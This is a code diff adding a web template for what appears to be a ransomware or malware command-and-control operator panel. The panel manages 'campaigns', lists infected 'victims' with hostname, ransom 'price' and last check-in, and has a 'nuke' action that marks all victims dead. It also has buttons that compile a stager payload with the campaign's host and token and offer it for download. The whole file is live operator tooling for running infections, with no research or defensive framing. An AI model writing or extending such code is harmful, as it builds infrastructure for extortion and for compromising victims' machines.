@@ -1,0 +1,85 @@
+{% extends "base.html" %}
+{% block title %}campaign {{ c['name'] }}{% endblock %}
+{% block content %}
+<h1>{{ c['name'] }}</h1>
+<div class="panel">
+  <form method="post">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <label class="small">note</label>
+    <input name="note" value="{{ c['note'] or '' }}">
+    <label class="small">active</label>
+    <input type="checkbox" name="active" value="1" {% if c['active'] %}checked{% endif %}>
+    <label class="small">config JSON</label>
+    <textarea name="config" rows="8">{{ c['config'] or '{}' }}</textarea>
+    <div style="height:8px"></div>
+    <button class="btn blue" type="submit">SAVE</button>
+  </form>
+  <form method="post" action="{{ url_for('campaign_build', cid=c['id']) }}">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn red" type="submit">BUILD CONFIG</button>
+  </form>
+  {% if is_root %}
+  <form method="post" action="{{ url_for('campaign_nuke', cid=c['id']) }}"
+        onsubmit="return confirm('NUKE this campaign? Every assigned victim is marked dead and all builds are revoked.')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn red" type="submit">NUKE CAMPAIGN</button>
+  </form>
+  {% endif %}
+</div>
+<div class="panel">
+  <h2>Victims ({{ victims|length }})</h2>
+  <table>
+    <tr><th>vid</th><th>host</th><th>status</th><th>price</th><th>last ping</th></tr>
+    {% for v in victims %}
+    <tr><td><a href="{{ url_for('victim', vid=v['vid']) }}">{{ v['vid'][:12] }}</a></td>
+    <td>{{ v['hostname'] or '' }}</td><td>{{ v['status'] }}</td>
+    <td>{{ v['price'] }}</td><td class="small">{{ v['last_ping'] or '' }}</td></tr>
+    {% else %}<tr><td colspan="5" class="sub">none assigned</td></tr>{% endfor %}
+  </table>
+</div>
+<div class="panel">
+  <h2>Binary builds</h2>
+  <p class="sub small">Compiles this campaign's host/token into a stager. Requires MSBuild + loader on this host.</p>
+  <form method="post" action="{{ url_for('campaign_compile', cid=c['id']) }}">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn blue" type="submit">BUILD STAGER</button>
+  </form>
+  <table id="builds">
+    <tr><th>id</th><th>status</th><th>sha256</th><th>updated</th><th></th></tr>
+    <tr><td colspan="5" class="sub">loading…</td></tr>
+  </table>
+  <script>
+  (function(){
+    function tick(){
+      fetch("{{ url_for('campaign_builds_json', cid=c['id']) }}")
+        .then(function(r){ return r.json(); })
+        .then(function(j){
+          var rows = j.builds || [];
+          var html = '<tr><th>id</th><th>status</th><th>sha256</th><th>updated</th><th></th></tr>';
+          if (!rows.length) html += '<tr><td colspan="5" class="sub">no builds yet</td></tr>';
+          rows.forEach(function(b){
+            html += '<tr><td>' + b.id + '</td><td>' + b.status + '</td><td class="small">'
+              + (b.sha256 || '').slice(0,16) + '</td><td class="small">' + (b.updated || '')
+              + '</td><td>' + (b.status === 'done'
+                ? '<a class="btn dim" href="/admin/build/' + b.id + '/stager">DOWNLOAD</a>'
+                : '') + '</td></tr>';
+          });
+          document.getElementById('builds').innerHTML = html;
+        }).catch(function(){});
+    }
+    tick(); setInterval(tick, 4000);
+  })();
+  </script>
+</div>
+
+<div class="panel">
+  <h2>Artifacts</h2>
+  <table>
+    <tr><th>id</th><th>kind</th><th>name</th><th>sha256</th><th>created</th></tr>
+    {% for a in artifacts %}
+    <tr><td>{{ a['id'] }}</td><td>{{ a['kind'] }}</td><td>{{ a['name'] }}</td>
+    <td class="small">{{ a['sha256'][:32] }}</td><td class="small">{{ a['created'] }}</td></tr>
+    {% else %}<tr><td colspan="5" class="sub">none</td></tr>{% endfor %}
+  </table>
+</div>
+{% endblock %}
